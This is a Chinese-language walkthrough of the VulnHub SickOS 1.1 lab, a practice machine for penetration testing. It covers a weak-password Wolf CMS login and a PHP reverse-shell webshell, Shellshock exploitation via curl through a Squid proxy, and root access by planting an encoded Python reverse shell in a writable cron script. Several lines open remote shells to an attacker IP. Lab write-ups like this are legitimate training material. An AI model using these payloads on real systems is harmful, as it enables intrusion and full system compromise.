---
{"dg-publish":true,"dg-path":"安全/靶机/vulnhub_SickOS1.1.md","permalink":"/安全/靶机/vulnhub_SickOS1.1/","title":"vulnhub_SickOS1.1"}
---

靶机ip
```
192.168.1.61
```
![Pasted image 20250121133207.png](/img/user/picture/Pasted%20image%2020250121133207.png)


端口扫描：
![Pasted image 20250121133500.png](/img/user/picture/Pasted%20image%2020250121133500.png)

![Pasted image 20250121133737.png](/img/user/picture/Pasted%20image%2020250121133737.png)


经了解3128端口开的是一个网络代理，要访问就需要经过代理
![Pasted image 20250121135605.png](/img/user/picture/Pasted%20image%2020250121135605.png)
![Pasted image 20250121135615.png](/img/user/picture/Pasted%20image%2020250121135615.png)
![Pasted image 20250121135632.png](/img/user/picture/Pasted%20image%2020250121135632.png)
![Pasted image 20250121140533.png](/img/user/picture/Pasted%20image%2020250121140533.png)

经网络所搜找到后台管理路径
```
 http://192.168.1.61/wolfcms/?/admin/login
```

尝试一下弱密码爆破，得到账号密码
```
admin
admin
```


![Pasted image 20250121143416.png](/img/user/picture/Pasted%20image%2020250121143416.png)
加入一句话木马
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.55/4488 0>&1'");?>
```
点击Articles
![Pasted image 20250121143448.png](/img/user/picture/Pasted%20image%2020250121143448.png)
得到webshell
![Pasted image 20250121143532.png](/img/user/picture/Pasted%20image%2020250121143532.png)
在config.php中找到数据库配置信息
![Pasted image 20250121143621.png](/img/user/picture/Pasted%20image%2020250121143621.png)
其中暴露出一个密码
`john@123`

![Pasted image 20250121143702.png](/img/user/picture/Pasted%20image%2020250121143702.png)
尝试一下这个密码
![Pasted image 20250121143853.png](/img/user/picture/Pasted%20image%2020250121143853.png)


sudo 三个all
![Pasted image 20250121143916.png](/img/user/picture/Pasted%20image%2020250121143916.png)


拿到root
![Pasted image 20250121144009.png](/img/user/picture/Pasted%20image%2020250121144009.png)


也可以：
![Pasted image 20250121170252.png](/img/user/picture/Pasted%20image%2020250121170252.png)
![Pasted image 20250121170259.png](/img/user/picture/Pasted%20image%2020250121170259.png)
![Pasted image 20250121170445.png](/img/user/picture/Pasted%20image%2020250121170445.png)

![Pasted image 20250121182139.png](/img/user/picture/Pasted%20image%2020250121182139.png)




## webshell

利用nikto工具扫描
```
 sudo nikto -h 192.168.1.62 -useproxy 192.168.1.62:3128
```

发现有这么一行：
```
+ /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
```
说明`/cgi-bin/status`文件存在shellshock漏洞

验证shellshock漏洞存在：
```
sudo curl   -x http://192.168.1.62:3128 http://192.168.1.62/cgi-bin/status -H "Referer:() { test;}; echo 'Content-Type: text/plain'; echo;echo; /usr/bin/id;exit"
```


![Pasted image 20250121214407.png](/img/user/picture/Pasted%20image%2020250121214407.png)


生成反弹shellpayload：
```
sudo msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.55 lport=443 -f raw
```

```
0<&206-;exec 206<>/dev/tcp/192.168.1.55/443;sh <&206 >&206 2>&206
```

我们修改一下上面测试命令：
```
sudo curl   -x http://192.168.1.62:3128 http://192.168.1.62/cgi-bin/status -H "Referer:() { test;}; 0<&206-;exec 206<>/dev/tcp/192.168.1.55/443;/bin/sh <&206 >&206 2>&206"
```
//注意这里要把sh修改为绝对路径

![Pasted image 20250121215132.png](/img/user/picture/Pasted%20image%2020250121215132.png)
拿到了webshell
但是现在shell交互性差，尝试升级shell，参考[[blog/THM/netcat shell稳定\|netcat shell稳定]]

```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```
现在这个shell中就可以使用clear等


```shell
www-data@SickOs:/etc/cron.d$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```


```shell
www-data@SickOs:/etc/cron.d$ ls
ls
automate  php5
www-data@SickOs:/etc/cron.d$ cat automate
cat automate

* * * * * root /usr/bin/python /var/www/connect.py
www-data@SickOs:/etc/cron.d$ ls -l /var/www/connect.py
ls -l /var/www/connect.py
-rwxrwxrwx 1 root root 109 Dec  5  2015 /var/www/connect.py
```

发现有一个文件`/var/www/connect.py`会每分钟用root权限执行一次

生成反弹shellpayload：
```
sudo msfvenom -p cmd/unix/reverse_python lhost=192.168.1.55 lport=444 -f raw
```

```txt
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNqVUMEKwjAM/ZXRUwtS7dhEkR6GTBBRwe0+XK1sONuydP8vdRNpb8shTfreywtp30b3NgItXtJGLhbRL2CoTa+FBAgADVOx++ZGg+WIbWPK1hvKaJoiD3cOPEkS7xP46EnHB09ddqiOl7wMNxnB4ro/VUV5y7Mz8YdRoZWSwmLslgnUzp/4Ag30MZgYA322nVQak0CzmslnM/mxzzf8f2wq7l2H0bJu1RIaRD7d6GME')[0])))
```

等了一会，拿到shell
![Pasted image 20250121222239.png](/img/user/picture/Pasted%20image%2020250121222239.png)

![Pasted image 20250121222310.png](/img/user/picture/Pasted%20image%2020250121222310.png)